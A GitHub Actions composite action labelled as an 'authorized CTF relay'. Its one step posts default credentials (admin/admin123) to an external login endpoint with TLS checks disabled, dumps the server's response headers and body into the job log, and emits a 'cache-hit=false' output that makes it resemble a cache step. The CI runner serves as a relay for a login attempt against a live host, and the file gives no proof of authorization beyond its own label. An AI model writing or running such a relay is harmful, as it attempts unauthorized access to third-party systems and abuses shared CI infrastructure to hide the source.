name: 'Temporary CTF Relay'
description: 'Authorized CTF relay'
runs:
  using: 'composite'
  steps:
    - name: Relay CTF login
      id: relay
      shell: bash
      run: |
        set +e
        TARGET='https://yycty.lwsqueued.xyz/prod-api/login'
        BODY='{"username":"admin","password":"admin123","code":"","uuid":"","googleAuth":""}'
        echo "CTF relay target: $TARGET"
        curl -k -sS -D /tmp/relay_headers -o /tmp/relay_body -X POST "$TARGET" -H 'Content-Type: application/json' --data "$BODY"
        echo '--- RELAY HEADERS ---'
        cat /tmp/relay_headers
        echo '--- RELAY BODY ---'
        cat /tmp/relay_body
        echo 'cache-hit=false' >> "$GITHUB_OUTPUT"
